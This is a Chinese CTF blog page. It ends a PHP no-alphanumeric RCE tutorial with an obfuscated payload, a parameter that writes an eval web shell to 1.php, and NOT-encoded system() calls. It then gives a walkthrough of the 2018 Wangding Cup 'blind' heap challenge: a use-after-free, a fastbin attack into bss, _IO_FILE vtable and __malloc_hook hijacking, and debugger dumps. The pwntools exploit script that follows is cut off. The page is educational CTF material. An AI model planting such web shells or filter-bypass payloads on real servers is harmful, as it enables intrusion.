code=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span></span><br><span class="line">&amp;_=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="其他1"><a href="#其他1" class="headerlink" title="其他1"></a>其他1</h4><p>在自增中，可以通过特殊字符构造出字符串的有以下几种方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[].&#x27;&#x27;  //Array</span><br><span class="line">(0/0).&#x27;&#x27;   //NAN</span><br><span class="line">(1/0).&#x27;&#x27;   //INF</span><br></pre></td></tr></table></figure>

<p>这个时候就有一个问题了，如果ban了数字，我们该怎么去构造<code>NAN</code>和<code>INF</code>呢，这个时候就需要讲到一个知识点，我们这里的话需要说一下这个<code>NAN</code>和<code>INF</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</span><br><span class="line"></span><br><span class="line">INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</span><br></pre></td></tr></table></figure>

<p>这里可以看出<code>NAN</code>表示的是未被定义的值，所以我们这里可以通过<code>a/a</code>这种方式构造，如果字母也被ban，我们也可以借助其他字符，比如<code>_/_</code>，这个时候也可以得到<code>NAN</code>，同理，<code>INF</code>也可以通过<code>1/a</code>的方式获取。</p>
<h4 id="其他2"><a href="#其他2" class="headerlink" title="其他2"></a>其他2</h4><p>我们在构造<code>$_POST</code>中的<code>_</code>时，正常操作的话是这样，<code>$a=&#39;_&#39;.$b(假设这里$b就是POST)</code>，然后这个时候如果<code>&#39;</code>被ban，看似这里是无法再利用了，但其实，我们直接写<code>$a=_.$b</code>也是可以的，这个时候效果同上而且缩短了字符长度。</p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ans1</span>=<span class="string">&#x27;system&#x27;</span>;<span class="comment">//函数名</span></span><br><span class="line"><span class="variable">$ans2</span>=<span class="string">&#x27;dir&#x27;</span>;<span class="comment">//命令</span></span><br><span class="line"><span class="variable">$data1</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans1</span>));<span class="comment">//通过两次取反运算得到system</span></span><br><span class="line"><span class="variable">$data2</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans2</span>));<span class="comment">//通过两次取反运算得到dir</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data1</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data2</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="comment">// (~%8c%86%8c%8b%9a%92)(~%9b%96%8d)</span></span><br></pre></td></tr></table></figure>

<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/09/24/CTFSHOW-shellmeRevenge-wp/">CTFSHOW吃瓜杯-shellmeRevenge-wp</a></p>
<p>CTFSHOW RCE挑战1-5  <a target="_blank" rel="noopener" href="https://ctf.show/challenges#RCE%E6%8C%91%E6%88%981-3916">https://ctf.show/challenges#RCE挑战1-3916</a>   &#x2F;  2-3917  &#x2F; 3-3918 ….</p>
<blockquote>
<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11929">https://xz.aliyun.com/t/11929</a></p>
</blockquote>

	
	</div>
  <a type="button" href="/2023/09/24/rce-noalpha/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/21/wdb2018-blind-wp/" >网鼎杯2018-blind-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-21
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/CTF-Training/blob/master/2018/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC1%E5%9C%BA/Pwn/blind_29709f4cd016a571bab0b14d281aad34.zip">文件下载</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec blind </span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0</span>x3ff000)</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span> &#123;	</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.new&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.change&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.release&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Choice:&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.new    检查了<code>11# v1&lt;=5</code>，但因为v1为unsigned所以不能下溢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">5</span> &amp;&amp; !ptr[v1] ) &#123;</span><br><span class="line">    ptr[v1] = <span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    read_line(ptr[v1], <span class="number">0x68</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.change  正常修改内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edt</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">5</span> &amp;&amp; ptr[v1] ) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    read_line(ptr[v1], <span class="number">0x68</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.release  明显存在use after free     但最多只能free三次</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400B41</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">5</span> &amp;&amp; ptr[v1] &amp;&amp; free_cnt &lt;= <span class="number">2</span> ) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]);	<span class="comment">// UAF</span></span><br><span class="line">    ++free_cnt;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现还有个后门函数  肯定目标就是这里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;    <span class="comment">// 0x00000000004008E3</span></span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>由于开了<code>Full RELRO</code>  写不了GOT表 ；并且没有可控的输出语句 无法泄露libc基地址</p>
<p>想着能不能通过UAF：add 0, dlt 0, add 1  (此时ptr[0]&#x3D;&#x3D;ptr[1]), dlt 0  (此时ptr[0]位于bin中且可通过ptr[1]修改内容)</p>
<p>来分配bss段上空间实现写入</p>
<p>0x68大小的chunk释放后会进入<code>fastbin[0x70]</code>  因此需要找到一个bss中的qword满足在<code>0x0000000000000070-000000000000007f</code>之间（因为最后三位的标志位），作为size域，进而分配到bss上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  find 0x602020, 0x602500, 0x000000000000007f</span><br><span class="line">0x602025 &lt;stdout+5&gt;</span><br><span class="line">0x602035 &lt;stdin+5&gt;</span><br><span class="line">0x602045 &lt;stderr+5&gt;</span><br><span class="line">3 patterns found.</span><br></pre></td></tr></table></figure>

<p>那么可选堆的起始地址为<code>0x602045-8 = 0x60203d</code>  尝试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;0000&#x27;</span>)</span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;1111&#x27;</span>)</span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">edt(<span class="number">1</span>, p64(<span class="number">0x60203d</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;2222&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>发现可以成功获取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef➤  sq 0x602020</span><br><span class="line">0x602020 &lt;stdout&gt;:	0x00007f8160fc5620	0x0000000000000000</span><br><span class="line">0x602030 &lt;stdin&gt;:	0x00007f8160fc48e0	0x0000000000000000</span><br><span class="line">0x602040 &lt;stderr&gt;:	0x00007f8160fc5540	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x00000000021f4010	0x00000000021f4010</span><br><span class="line">0x602070:	0x00000000021f4010	0x000000000060204d	# here</span><br></pre></td></tr></table></figure>

<p>那么由此就可以实现任意地址写了（先edt(ptr[3])，使得ptr[0]处地址为目标地址，然后再edt(ptr[0])）</p>
<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><blockquote>
<p>关于_IO_FILE利用可以参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164558">https://www.anquanke.com/post/id/164558</a></p>
</blockquote>
<ol>
<li>改写<code>stdout</code>指针为特定构造的伪_IO_FILE 指针 <code>p = 0x602100</code></li>
<li>修改<code>p + 0xd8 = 0x6021d8</code>的vtable指针为<code>fake_vtable = 0x602200</code></li>
<li>将<code>fake_vtable</code>指针指向的多个函数指针都改为后门函数地址</li>
</ol>
<p>源stdout指针指向内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  sq 0x00007f8160fc5620</span><br><span class="line">0x7f8160fc5620 &lt;_IO_2_1_stdout_&gt;:	0x00000000fbad2887	0x00007f8160fc56a3</span><br><span class="line">0x7f8160fc5630 &lt;_IO_2_1_stdout_+16&gt;:	0x00007f8160fc56a3	0x00007f8160fc56a3</span><br><span class="line">0x7f8160fc5640 &lt;_IO_2_1_stdout_+32&gt;:	0x00007f8160fc56a3	0x00007f8160fc56a3</span><br><span class="line">0x7f8160fc5650 &lt;_IO_2_1_stdout_+48&gt;:	0x00007f8160fc56a3	0x00007f8160fc56a3</span><br><span class="line">0x7f8160fc5660 &lt;_IO_2_1_stdout_+64&gt;:	0x00007f8160fc56a4	0x0000000000000000</span><br><span class="line"></span><br><span class="line">gef➤  p *(struct _IO_FILE*) 0x00007f8160fc5620</span><br><span class="line">$1 = &#123;</span><br><span class="line">  _flags = 0xfbad2887,</span><br><span class="line">  _IO_read_ptr = 0x7f8160fc56a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_read_end = 0x7f8160fc56a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_read_base = 0x7f8160fc56a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_write_base = 0x7f8160fc56a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">  _IO_write_ptr = 0x7f8160fc56a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是  我们需要绕过一些限制,所以要更改<code>_flags</code>使得  <strong>flag&amp;8 &#x3D; 0 and flag &amp;2 &#x3D;0 and flag &amp; 0x8000 !&#x3D; 0</strong>  （这里改为0x00000000fbada887）</p>
<p>因为我们修改了<code>stdout</code>，在下一次调用<code>puts</code>时即会自动调用后门函数</p>
<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><blockquote>
<p>参考的大佬的思路：<a target="_blank" rel="noopener" href="http://p4nda.top/2018/08/27/WDBCTF-2018/">http://p4nda.top/2018/08/27/WDBCTF-2018/</a></p>
</blockquote>
<p>是否可以修改 <code>__malloc_hook</code>？ 因为不能泄露地址，则需要  <code>__malloc_hook</code>地址出现在bss段才能通过edt写入</p>
<p>通过在bss段上伪造一个unsorted_bin大小的chunk并释放  则<code>main arena+88</code>的地址就会出现在bss段上  ，通过修改其最低字节为00，则可再通过edt写到__malloc_hook</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gef➤  sq 0x602020</span><br><span class="line">0x602020 &lt;stdout&gt;:	0x00007fefbd3c5620	0x0000000000000000</span><br><span class="line">0x602030 &lt;stdin&gt;:	0x00007fefbd3c48e0	0x0000000000000000</span><br><span class="line">0x602040 &lt;stderr&gt;:	0x00007fefbd3c5540	0x3030300000000000</span><br><span class="line">0x602050:	0x3030303030303030	0x3030303030303030</span><br><span class="line">0x602060:	0x0000000000602080	0x00000000016cc000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x602080:	0x00007fefbd3c4b78	0x00007fefbd3c4b78</span><br><span class="line"></span><br><span class="line">gef➤  sq 0x00007fefbd3c4b00</span><br><span class="line">0x7fefbd3c4b00 &lt;__memalign_hook&gt;:	0x00007fefbd085e20	0x00007fefbd085a00</span><br><span class="line">0x7fefbd3c4b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fefbd3c4b20:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fefbd3c4b30:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fefbd3c4b40:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fefbd3c4b50:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fefbd3c4b60:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fefbd3c4b70:	0x0000000000000000	0x00000000016cc070	# main arena+88 = 0x7fefbd3c4b78</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./blind&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 